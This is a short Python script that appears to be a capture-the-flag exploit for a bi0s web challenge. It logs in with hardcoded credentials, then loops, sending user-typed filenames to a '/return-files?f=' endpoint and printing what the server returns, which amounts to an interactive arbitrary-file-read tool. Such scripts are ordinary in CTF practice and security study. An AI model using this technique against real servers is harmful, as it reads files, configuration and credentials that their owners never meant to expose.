import requests
import signal
import sys
import os

TARGET_URL = 'http://web.challenge.bi0s.in:6006'

def signal_handler(sig, frame):
    print('Exiting...')
    sys.exit(0)

def login():
    s = requests.Session()
    data={  "username":"navy",
            "password":"navy",
            "submit":"Login"    }
    r = s.post(TARGET_URL+'/login',data=data)
    return s

def get_file(s,file):
    r=s.get(TARGET_URL+'/return-files?f='+file)
    print(r.text)

def main():
    s=login()
    while True:
        os.system('clear')
        signal.signal(signal.SIGINT, signal_handler)
        f=input("Filename: ")
        get_file(s,f)
        cont=input("Press enter to continue")

main()